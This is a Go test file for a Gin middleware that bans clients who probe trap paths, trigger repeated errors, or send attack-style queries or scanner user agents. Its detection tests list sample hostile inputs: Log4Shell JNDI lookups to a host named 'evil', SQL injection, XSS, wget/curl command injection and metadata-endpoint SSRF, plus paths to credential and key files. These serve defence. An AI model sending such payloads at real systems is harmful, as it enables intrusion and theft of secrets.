package middleware_test

import (
	"net/http"
	"net/http/httptest"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"go.uber.org/zap"

	"github.com/jun-develop/junkit/cache"
	"github.com/jun-develop/junkit/middleware"
)

func newBannerRouter(opts middleware.BannerOptions) (*gin.Engine, *fakeNotifier) {
	gin.SetMode(gin.TestMode)
	notifier := newFakeNotifier()
	router := gin.New()
	router.Use(middleware.Banner(opts, zap.NewNop(), newResponder(), notifier))
	router.GET("/ok", func(c *gin.Context) { c.String(http.StatusOK, "ok") })

	return router, notifier
}

func baseBannerOptions() middleware.BannerOptions {
	return middleware.BannerOptions{
		Cache:        cache.NewMemoryCache[int64](),
		MaxStrikes:   3,
		StrikeWindow: time.Minute,
		BanDurations: []time.Duration{time.Minute, time.Hour},
	}
}

func get(router *gin.Engine, path, remoteAddr string) *httptest.ResponseRecorder {
	r := httptest.NewRequest(http.MethodGet, path, nil)
	r.RemoteAddr = remoteAddr
	w := httptest.NewRecorder()
	router.ServeHTTP(w, r)

	return w
}

func TestBanner_TrapPathBansAtOnce(t *testing.T) {
	router, notifier := newBannerRouter(baseBannerOptions())

	if w := get(router, "/.ENV.bak", "203.0.113.1:1"); w.Code != http.StatusForbidden || w.Header().Get("Retry-After") != "60" {
		t.Fatalf("trap request = %d Retry-After %q, want 403 and 60", w.Code, w.Header().Get("Retry-After"))
	}

	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusForbidden || !strings.Contains(w.Body.String(), "suspicious activity") {
		t.Fatalf("request after ban = %d %s, want 403 access_denied", w.Code, w.Body)
	}

	if w := get(router, "/ok", "203.0.113.2:1"); w.Code != http.StatusOK {
		t.Fatalf("another client = %d, want 200", w.Code)
	}

	if msg := <-notifier.messages; !strings.Contains(msg, "trap path") {
		t.Errorf("alert = %q, want the reason", msg)
	}
}

func TestBanner_StrikesBanAtMaxStrikes(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())

	for i := range 3 {
		if w := get(router, "/missing", "203.0.113.1:1"); w.Code != http.StatusNotFound {
			t.Fatalf("strike %d = %d, want 404 (the ban starts after the response)", i+1, w.Code)
		}
	}

	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusForbidden {
		t.Fatalf("request after 3 strikes = %d, want 403", w.Code)
	}
}

func TestBanner_SuccessfulResponsesAreNotStrikes(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())

	for range 10 {
		get(router, "/ok", "203.0.113.1:1")
	}

	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
}

func TestBanner_BanDurationEscalates(t *testing.T) {
	opts := baseBannerOptions()
	router, _ := newBannerRouter(opts)

	get(router, "/.git/config", "203.0.113.1:1")
	_ = opts.Cache.Delete(t.Context(), "banner:ban:203.0.113.1") // first ban ends

	if w := get(router, "/.git/config", "203.0.113.1:1"); w.Header().Get("Retry-After") != "3600" {
		t.Fatalf("second ban Retry-After = %q, want 3600", w.Header().Get("Retry-After"))
	}
}

func TestBanner_IPv6ClientIsBannedByItsSlash64(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())

	get(router, "/.env", "[2001:db8:1:2::1]:1")

	if w := get(router, "/ok", "[2001:db8:1:2::99]:1"); w.Code != http.StatusForbidden {
		t.Errorf("same /64 = %d, want 403", w.Code)
	}

	if w := get(router, "/ok", "[2001:db8:1:3::1]:1"); w.Code != http.StatusOK {
		t.Errorf("another /64 = %d, want 200", w.Code)
	}
}

func TestBanner_WhitelistedIPIsNeverBanned(t *testing.T) {
	opts := baseBannerOptions()
	opts.IPWhitelist = []string{"203.0.113.1"}
	router, _ := newBannerRouter(opts)

	get(router, "/.env", "203.0.113.1:1")

	if w := get(router, "/ok", "203.0.113.1:1"); w.Code != http.StatusOK {
		t.Errorf("whitelisted = %d, want 200", w.Code)
	}
}

func TestBanner_LimiterRejectionsCountAsStrikes(t *testing.T) {
	gin.SetMode(gin.TestMode)
	router := gin.New()
	router.Use(
		middleware.Banner(baseBannerOptions(), zap.NewNop(), newResponder(), nil),
		middleware.Limiter(baseLimiterOptions(), zap.NewNop(), newResponder(), nil),
	)
	router.GET("/ok", func(c *gin.Context) { c.String(http.StatusOK, "ok") })

	codes := make([]int, 5)
	for i := range codes {
		codes[i] = get(router, "/ok", "203.0.113.1:1").Code
	}

	want := []int{200, 429, 429, 429, 403}
	for i := range want {
		if codes[i] != want[i] {
			t.Fatalf("codes = %v, want %v", codes, want)
		}
	}
}

func TestDefaultTrapPaths(t *testing.T) {
	assertPattern(t, middleware.DefaultTrapPaths,
		[]string{
			"/.env", "/.env.example", "/.ENV.local", "/api/.env", "/production.env", "/config/app.env.bak",
			"/.git/config", "/backend/.git/HEAD", "/.aws/credentials", "/.DS_Store", "/.htaccess", "/.npmrc",
			"/.vscode/sftp.json", "/root/.ssh/id_rsa", "/id_ed25519.pub",
			"/index.php", "/wp-login.php", "/admin/config.php7", "/default.aspx", "/login.do", "/db.sql",
			"/site.bak", "/backup.sqlite3", "/wp-admin/", "/blog/wp-content/x", "/phpmyadmin", "/pma/index",
			"/vendor/phpunit/phpunit/src", "/cgi-bin/luci", "/actuator/health", "/manager/html", "/owa/auth",
			"/+CSCOE+/logon.html", "/remote/login", "/_ignition/execute-solution", "/api/../../etc/passwd",
			"/WEB-INF/web.xml", "/..\\windows\\win.ini",
		},
		[]string{
			"/", "/health", "/favicon.ico", "/robots.txt", "/api/v1/users", "/api/v1/users/0b6f3c3e-4c1a-4e5e-9f6a-1c2d3e4f5a6b",
			"/api/v1/environments", "/api/v1/settings.json", "/uploads/avatars/a.png", "/api/v1/pmax",
			"/.well-known/security.txt", "/api/v1/php-guides", "/api/v1/backup", "/api/v1/owners",
			"/api/v1/solrs", "/api/v1/docs/install.sh", "/api/v1/exports/report.zip",
		})
}

func TestDefaultAttackPatterns(t *testing.T) {
	assertPattern(t, middleware.DefaultAttackPatterns,
		[]string{
			"/api?x=${jndi:ldap://evil/a}", "/api?q=<script>alert(1)</script>", "/api?u=javascript:alert(1)",
			"/api?id=1 UNION ALL SELECT password FROM users", "/api?id=1+union+select+1", "/api?id=1/**/UNION/**/SELECT 1",
			"/api?id=1 AND SLEEP(5)", "/api?id=1;waitfor delay '0:0:5'", "/api?c=;wget http://x/s", "/api?c=$(curl x)",
			"/api?f=php://filter/resource=index", "/api?url=http://169.254.169.254/latest/meta-data", "/api?f=a\x00.png",
		},
		[]string{
			"/api/v1/users?page=2&per_page=20", "/api/v1/search?q=union station", "/api/v1/search?q=select a plan",
			"/api/v1/search?q=sleep tips", "/api/v1/users?sort=-created_at", "/api/v1/posts?q=curl tutorial",
		})
}

func TestDefaultScannerAgents(t *testing.T) {
	assertPattern(t, middleware.DefaultScannerAgents,
		[]string{
			"sqlmap/1.7.2#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.1.6)", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
			"Fuzz Faster U Fool v2.1.0", "gobuster/3.6", "WPScan v3.8.25", "Mozilla/5.0 zgrab/0.x",
		},
		[]string{
			"", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
			"curl/8.4.0", "okhttp/4.12.0", "python-httpx/0.27.0", "Go-http-client/1.1", "PostmanRuntime/7.36.0",
			"Dart/3.2 (dart:io)",
		})
}

func TestBanner_BansScannerAgentAndAttackQuery(t *testing.T) {
	router, _ := newBannerRouter(baseBannerOptions())

	r := httptest.NewRequest(http.MethodGet, "/ok", nil)
	r.RemoteAddr = "203.0.113.1:1"
	r.Header.Set("User-Agent", "sqlmap/1.7")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, r)
	if w.Code != http.StatusForbidden {
		t.Errorf("scanner agent = %d, want 403", w.Code)
	}

	// %24%7Bjndi: is ${jndi: encoded, as scanners send it.
	if w := get(router, "/ok?x=%24%7Bjndi:ldap://evil/a%7D", "203.0.113.2:1"); w.Code != http.StatusForbidden {
		t.Errorf("encoded Log4Shell query = %d, want 403", w.Code)
	}
}

func TestBanner_EmptyListTurnsACheckOff(t *testing.T) {
	opts := baseBannerOptions()
	opts.TrapPaths = []*regexp.Regexp{}
	router, _ := newBannerRouter(opts)

	if w := get(router, "/.env", "203.0.113.1:1"); w.Code != http.StatusNotFound {
		t.Errorf("trap path with no TrapPaths = %d, want 404", w.Code)
	}
}

func assertPattern(t *testing.T, res []*regexp.Regexp, match, skip []string) {
	t.Helper()
	matches := func(s string) bool {
		return slices.ContainsFunc(res, func(re *regexp.Regexp) bool { return re.MatchString(strings.ToLower(s)) })
	}

	for _, s := range match {
		if !matches(s) {
			t.Errorf("%q not matched", s)
		}
	}

	for _, s := range skip {
		if matches(s) {
			t.Errorf("%q matched, want allowed", s)
		}
	}
}

// BenchmarkBanner_CleanRequest measures a request to a real route, the cost every client pays.
func BenchmarkBanner_CleanRequest(b *testing.B) {
	router, _ := newBannerRouter(baseBannerOptions())
	r := httptest.NewRequest(http.MethodGet, "/ok?page=2&per_page=20&sort=-created_at&q=report", nil)
	r.RemoteAddr = "203.0.113.1:1"
	r.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15")

	for b.Loop() {
		w := httptest.NewRecorder()
		router.ServeHTTP(w, r)
		if w.Code != http.StatusOK {
			b.Fatalf("status = %d, want 200", w.Code)
		}
	}
}
